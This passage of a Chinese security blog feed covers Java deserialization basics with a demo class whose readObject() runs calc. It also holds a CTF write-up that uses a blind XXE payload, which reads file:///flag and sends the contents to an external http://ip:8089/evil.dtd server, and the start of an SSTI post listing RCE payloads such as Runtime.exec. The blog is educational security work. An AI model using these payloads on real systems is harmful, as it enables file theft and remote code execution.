title="小结"></a>小结</h2><p>&emsp;&emsp; <code>PriorityQueue</code>原本只是个优先队列，<code>TemplatesImpl</code>原本只是在xalan中的处理xml的模板实现，但是经过大佬之手二者结合产生巨大效果。吾不敢不服，下面只想用一图展现笔者对此gadget的思考。<br><img src="https://img-blog.csdnimg.cn/20200520144825335.png" alt="在这里插入图片描述"></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 看完其实不难发现，Java反序列化漏洞必然离不开Java的反射机制的作用。这种都是底层的Java语言的开发者所想到便于开发的机制，下图是oracle官方给出的图例，笔者觉得如果想要打开一个新方向必然会用到一种“新”机制，这种机制应该还是开发人员经常使用的。<br><img src="https://img-blog.csdnimg.cn/20200520151819350.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 一个新的Gadget的产生构造笔者有几点愚见，如有错误还望海涵。</p><ol><li>一个JDK自带的实现<code>Serializabe</code>接口</li><li>必然离不开Java反射机制</li><li>readObject()方法</li></ol><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://tool.oschina.net/apidocs/apidoc?api=commons-collections" target="_blank" rel="noopener">https://tool.oschina.net/apidocs/apidoc?api=commons-collections</a><br><a href="https://paper.seebug.org/1195/" target="_blank" rel="noopener">https://paper.seebug.org/1195/</a><br><a href="http://blog.orleven.com/2017/11/11/java-deserialize/" target="_blank" rel="noopener">http://blog.orleven.com/2017/11/11/java-deserialize/</a><br><a href="https://xz.aliyun.com/t/7031#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/7031#toc-5</a><br><a href="https://blog.csdn.net/chenwan8737/article/details/100716015" target="_blank" rel="noopener">https://blog.csdn.net/chenwan8737/article/details/100716015</a><br><a href="https://blog.csdn.net/weixin_33802505/article/details/92214760" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33802505/article/details/92214760</a><br><a href="https://blog.csdn.net/21aspnet/article/details/81671777" target="_blank" rel="noopener">https://blog.csdn.net/21aspnet/article/details/81671777</a><br><a href="https://xalan.apache.org/xalan-j/apidocs/index.html" target="_blank" rel="noopener">https://xalan.apache.org/xalan-j/apidocs/index.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;﻿# 前言&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp; 如果你没有反序列化的基础，建议你看笔者博客文章先将基础学习一下。如果你没有学习分析过&lt;code&gt;ysoserial--Gadget--URLDNS&lt;/code&gt;，建议你看笔者之前发过的文章学习一下。如果你是大佬，前面当笔者
      
    
    </summary>
    
    
    
      <category term="Java Commons-Collections" scheme="https://summersec.github.io/tags/Java-Commons-Collections/"/>
    
  </entry>
  
  <entry>
    <title>漫谈Java反序列化</title>
    <link href="https://summersec.github.io/2020/05/20/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://summersec.github.io/2020/05/20/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-05-20T04:42:16.000Z</published>
    <updated>2020-05-20T08:11:22.281Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; Java的反序列化漏洞探索出了Java安全的新纪元。开发人员为什么要反序列化呢？众所周知，用户和服务器进行交互时，会传输一下数据，数据传输前需要格式化，将数据转化成服务器认可的格式。比例：<code>JSON</code>、<code>XML</code>。<br>&emsp;&emsp; <code>JSON</code>和<code>XML</code>的优点是兼容性比较强，是通用的数据交互格式。缺点是不支持复杂的数据类型。故开发人员面对需要复杂的数据类型是将数据反序列化，以来达数据交互的目的。<br>&emsp;&emsp;  Java程序在运行时，会产生大量的数据。有些时候，我们需要将内存中的对象信息存储到磁盘或者通过网络发送给第三者，此时，就需要对对象进行序列化操作。当我们需要从磁盘或网络读取存储的信息时，即为反序列化。简单理解，序列化即将内存中的对象信息转换为字节流并存储在磁盘或通过网络发送。反序列化，即从磁盘或网络读取信息，直接转换为内存对象。</p><p>PS: 为避免代码太长而导致的阅读效果，故将完整的实验代码全部已经上传至 <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p><hr><h1 id="反序列化demo"><a href="#反序列化demo" class="headerlink" title="反序列化demo"></a>反序列化demo</h1><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><p><strong>反序列化漏洞基本条件</strong></p><ol><li>Java反序列化类一定要实现<code>Serializabe</code>接口</li><li>所有的Java反序列化漏洞都是用通过<code>readObject()</code>实现</li><li>所有反序列化数据都是要通过<code>writeObject()</code>函数实现<br><img src="https://img-blog.csdnimg.cn/20200517185517421.png" alt="在这里插入图片描述"></li></ol><hr><p><strong>SerialVersionUID</strong><br>&emsp;&emsp; Java的序列化的机制通过判断serialVersionUID来验证版本的一致性。在反序列化的时候与本地的类的serialVersionUID进行比较，一致则可以进行反序列化，不一致则会抛出异常InvalidCastException。IDEA是可以自动生成一个serialVersionUID，需要设置如下。<br><img src="https://img-blog.csdnimg.cn/20200514152044147.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200514153405922.png" alt="在这里插入图片描述"></p><hr><h2 id="案例DEMO"><a href="#案例DEMO" class="headerlink" title="案例DEMO"></a>案例DEMO</h2><p><code>javaSerializableDemo1</code>源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javaSerializableDemo1</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="comment">// 序列版本ID</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">1877568378649280904L</span>;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Integer IdCard;</span><br><span class="line">    <span class="keyword">private</span> Date time;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">javaSerializableDemo1</span><span class="params">(String username, String password, Integer age, Integer idCard, Date time)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        IdCard = idCard;</span><br><span class="line">        <span class="keyword">this</span>.time = time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 省略一部分set、get方法。</span></span><br><span class="line">   </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"javaSerializableDemo&#123;"</span> +</span><br><span class="line">                <span class="string">"username='"</span> + username + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", password='"</span> + password + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">", IdCard="</span> + IdCard +</span><br><span class="line">                <span class="string">", time="</span> + time +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>javaUnSerizableDemo1</code>源码，一般情况下<code>对象写入流writerObject()</code>和<code>对象的输出流readObject</code>是分开实现的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javaUnSerializableDemo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        javaSerializableDemo1 demo = <span class="keyword">new</span> javaSerializableDemo1(<span class="string">"Summer"</span>,<span class="string">"6666888"</span>,<span class="number">18</span>,<span class="number">666666</span>,<span class="keyword">new</span> Date());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"serializable: "</span> + demo);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将对象写入文件中</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">"tempFile.txt"</span>);</span><br><span class="line">            oos = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            oos.writeObject(demo);</span><br><span class="line"></span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读文件</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"tempFile.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            ois = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            javaSerializableDemo1 newdemo = (javaSerializableDemo1) ois.readObject();</span><br><span class="line">            System.out.println(<span class="string">"unserializable: "</span> + newdemo);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020051416583311.png" alt="在这里插入图片描述"><br>由于是字节码，直接打开是乱码。<br><img src="https://img-blog.csdnimg.cn/20200514165909506.png" alt="在这里插入图片描述"><br>用vscode插件<code>hexdump</code>查看生成的文件。<br><img src="https://img-blog.csdnimg.cn/20200514170059910.png" alt="在这里插入图片描述"><br>或者使用<code>SerializationDumper.jar</code>工具，效果如下部分截图。<br>下载地址：<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">https://github.com/NickstaDB/SerializationDumper</a><br><img src="https://img-blog.csdnimg.cn/2020051417045964.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 这个DEMO中实现了笔者前文所提及到的三要素，但似乎你还看不出来漏洞的存在的地方。</p><hr><h2 id="漏洞DEMO"><a href="#漏洞DEMO" class="headerlink" title="漏洞DEMO"></a>漏洞DEMO</h2><p>&emsp;&emsp; 下面会以一个存在的漏洞demo，带你更进一步理解Java反序列化的危害。<br><strong>漏洞源码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerabilityClass</span> <span class="keyword">implements</span> <span class="title">summer</span>.<span class="title">serializable</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">5550839108669505813L</span>;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="comment">// 加入执行命令代码</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulnerabilityClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略set、get方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"VulnerabilityClass&#123;"</span> +</span><br><span class="line">                <span class="string">"username='"</span> + username + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", password='"</span> + password + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", date="</span> + date +</span><br><span class="line">                <span class="string">", id="</span> + id +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulnerabilityClass</span><span class="params">(String username, String password, Date date, Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">        <span class="keyword">this</span>.date = date;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 调用序列化方法</span></span><br><span class="line">        Serilizable();</span><br><span class="line">        <span class="comment">// 反序列化方法</span></span><br><span class="line">        UnSerializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Serilizable</span><span class="params">()</span></span>&#123;</span><br><span class="line">        VulnerabilityClass clazz = <span class="keyword">new</span> VulnerabilityClass();</span><br><span class="line">        clazz.setDate(<span class="keyword">new</span> Date());</span><br><span class="line">        clazz.setId(<span class="number">1314520</span>);</span><br><span class="line">        clazz.setPassword(<span class="string">"summer6666"</span>);</span><br><span class="line">        clazz.setUsername(<span class="string">"summer"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写文件</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"tempFile3"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">            oos.writeObject(clazz);</span><br><span class="line">            System.out.println(<span class="string">"serilizable: "</span> + clazz);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">UnSerializable</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"tempFile3"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">            VulnerabilityClass clazz = (VulnerabilityClass) ois.readObject();</span><br><span class="line">            System.out.println(<span class="string">"unserializable: "</span> + clazz);</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> VulnerabilityClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200516145552671.gif" alt="在这里插入图片描述"></p><p><strong>漏洞成因分析</strong></p><p>&emsp;&emsp; 在漏洞源码中的<code>readObject()</code>方法，第一行是默认的反序列化方法<code>defaultReadObject()</code>，但是下面一行是添加了<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>，虽然这里简单粗暴的将执行命令的代码写入了方法。实际的情况下，开发人员是不会这么做，笔者这里简单展示一下漏洞原理。实际情况都是攻击者通过各种伪造方法、修改、重定义等方法最后到达执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="comment">// 加入执行命令代码</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 反序列化漏洞三要素实现<code>Serializabe</code>接口、<code>readObject()</code>、<code>writeObject()</code>方法，缺一不可。但试想一下，如果用户控制了<code>readObject</code>亦或者是<code>writeObject</code>方法，那么是不是可以造成反序列化漏洞呢？其实也有一个问题控制不了<code>writeObject</code>方法，因为其在服务器内，或者是Java应用内，我们不可能去修改内部代码。所以说只能通过控制<code>readObject</code>方法，这里的控制得打双引号。问题来了，前人大佬们已经研究出来许多控制方法，经典<code>AnnotationInvocationHandler</code>和<code>BadAttributeValueExpException</code>类均满足条件，下篇文章带你分析。<br>&emsp;&emsp; 如果要深入理解反序列化漏洞可以去学习反序列化利用工具<code>ysoserial</code>。网上很多反序列化文章基本上都是研究<code>commons-collection</code>反序列化，但其实<code>commons-colection</code>反序列化链是很复杂，不建议新手小白学习。<code>ysoserial-Gadget-URLDNS</code>这条反序列化链建议新手小白学习，比较简单。推荐文章<a href="https://samny.blog.csdn.net/article/details/105790987" target="_blank" rel="noopener">小楼昨夜又春风，你知ysoserial-Gadget-URLDNS多少？</a>，这篇文章全方位的解释<code>URLDNS</code>这条链的利用、成因，相对其他作者写的文章分析更加全面，基本上你知道或者不知道都在文章里面。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Java的反序列化漏洞探索出了Java安全的新纪元。开发人员为什么要反序列化呢？众所周知，用户和服务器进行交互时，
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化" scheme="https://summersec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯---Java文件上传wp</title>
    <link href="https://summersec.github.io/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF---Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wp/"/>
    <id>https://summersec.github.io/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF---Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wp/</id>
    <published>2020-05-14T13:27:45.000Z</published>
    <updated>2020-05-29T06:08:57.330Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://samny.blog.csdn.net/article/details/104426472" target="_blank" rel="noopener">一篇文章读懂Java代码审计之XXE</a>看过我这篇博客应该不难，没看过建议在看看。</p><hr><h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>下载了所有的class发现需要上传xlsx poi<br>开头必须是execl<br><img src="https://img-blog.csdnimg.cn/20200510170315420.png" alt="在这里插入图片描述"></p><ul><li>新建execl</li></ul><p>-1.xlsx文件，修改后缀名execl<br>-1.xlsx.zip解压。<br><img src="https://img-blog.csdnimg.cn/20200510171215395.png" alt="在这里插入图片描述"></p><ul><li><p>修改[Content-Types].xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip:8089/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020051518123493.png" alt="在这里插入图片描述"></p></li><li><p>重新打包成<code>excel-1.xlsx</code>，文件名一定不能错。</p></li><li><p>在服务器上新建一个<code>evil.etd</code>文件。<br><img src="https://img-blog.csdnimg.cn/20200510170751751.png" alt="在这里插入图片描述"></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY send SYSTEM 'http://ip:8089/%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><hr><ul><li>然后直接上传，查看服务器http记录。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200510170959142.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2020051017050929.png" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://samny.blog.csdn.net/article/details/104426472&quot; target
      
    
    </summary>
    
    
    
      <category term="Java 文件上传" scheme="https://summersec.github.io/tags/Java-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>从安全角度谈Java反射机制--终章</title>
    <link href="https://summersec.github.io/2020/05/13/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E7%BB%88%E7%AB%A0/"/>
    <id>https://summersec.github.io/2020/05/13/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E7%BB%88%E7%AB%A0/</id>
    <published>2020-05-13T02:42:16.000Z</published>
    <updated>2020-05-13T02:30:57.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首发：<a href="https://www.sec-in.com/article/309" target="_blank" rel="noopener">https://www.sec-in.com/article/309</a><br>&emsp;&emsp; 通过前两章的了解，大家对Java反射机制有了一定的认知。本章作为反射篇的最终章，如果从反序列化的层面来说Java反射的具体危害，需要一些反序列化的基础知识。故笔者决定从反射机制本身来说，它的一个经常被使用的点—Server-Side Template Injection（简称SSTI），中文名服务器端模板注入。</p><hr><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>&emsp;&emsp; 模板引擎被广泛应用于Web应用程序中，通过网页和电子邮件呈现动态数据。将用户输入内容不安全嵌入到模板中，实现服务器端模板注入。SSTI极其容易被误认为是跨站点脚本（XSS），大多数人经常与之擦肩而过。与XSS不同的是，模板注入可以用于直接攻击Web服务器内部，并经常获得远程代码执行（RCE）。模板注入可以通过开发人员的错误配置，通过故意暴露模板，开发人员试图通过来其提供丰富的功能，就像维基、博客、营销应用和内容管理等系统。<br>&emsp;&emsp;先看通用的Java SSTI的payload，payload中的T通常是需要声明的变量，每一个模板引擎都不同。在这里，我们不能发现已经可以看到反射的<code>“影子”</code>了，下面会从每一个模板来具体分析介绍任何使用反射从<code>SSTI</code>到<code>RCE</code>。</p><ol><li>获取系统环境变量<blockquote><p>${T(java.lang.System).getenv()}</p></blockquote></li><li>读取文件内容<blockquote><ul><li>${T(java.lang.Runtime).getRuntime().exec(‘cat 